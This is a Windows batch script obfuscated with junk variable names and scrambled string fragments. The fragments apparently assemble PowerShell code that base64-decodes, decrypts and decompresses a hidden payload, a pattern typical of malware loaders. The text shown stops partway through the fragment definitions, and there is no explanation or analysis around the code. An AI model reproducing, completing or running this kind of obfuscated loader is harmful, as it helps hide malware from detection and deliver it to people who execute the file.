@echo off
%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%s%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%e%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%t%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%l%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%o%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%c%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%a%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%l%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM% %aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%e%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%n%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%a%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%b%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%l%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%e%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%d%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%e%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%l%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%a%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%y%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%e%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%d%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%e%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%x%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%p%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%a%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%n%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%s%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%i%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%o%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%n%aIZLRAmULFQgKkJrApNTggbjTHJOqbwQwHpGYDeGxQnCSommqM%
set "XCXWgffEHmRIFcDWfLMBexICvhQpsNJaDvjprYXsHwNUTfSSaw=s"
set "GZpEnAUuAYpQlUCRfjSoEgNuTHJNJppXpWgJKYiJuXxZdRkTrc=t"
set "huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM=!XCXWgffEHmRIFcDWfLMBexICvhQpsNJaDvjprYXsHwNUTfSSaw!e!GZpEnAUuAYpQlUCRfjSoEgNuTHJNJppXpWgJKYiJuXxZdRkTrc!"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "VLqeYLdbMJ=n($p"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "YqckLkHuBQ=tion"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "ehCJdQdGQf=yste"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "JzpopCjoHl=ar=["
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "bPJHHCzOni=pStr"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "lygpnxRLSJ=::Fr"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "LtiZcQIXrj=stem"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "otHfpYxQmX=Syst"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "kwVhgAwEYD=se()"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "IDlLppzyyG=tion"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "ezdYnCxvAI=Stri"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "JMaeObyvZJ=am(,"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "HEjKVPctRd=,$pa"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "wOKYTmKCeS= "%systemdrive%"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "tOZtfawYHn=decr"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "iKomaRgKcJ=vgK."
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "LhMgXUuunE=,'A'"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "qPfIKqccTu=t Sy"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "sNGLxNSVYo=omBa"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "gmObiMOxXq=stem"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "XQTSmkHBYG=func"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "eBwgiSgIHW=\Win"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "fsZZEvjEHu=ispo"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "QAcvNkDiRt=ode]"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "SAjlnQjICv=,$pa"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "MInNHdAkZC=essi"
